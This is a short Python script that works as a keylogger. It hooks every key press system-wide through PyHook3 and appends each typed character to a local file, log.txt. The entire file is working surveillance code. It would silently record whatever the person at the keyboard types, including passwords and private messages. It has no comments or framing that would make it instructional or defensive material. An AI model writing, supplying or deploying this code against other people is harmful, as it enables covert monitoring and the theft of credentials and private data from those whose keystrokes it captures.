import PyHook3, pythoncom, sys, logging


file_log = "log.txt"


def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log,level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True


hooks_manager = PyHook3.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()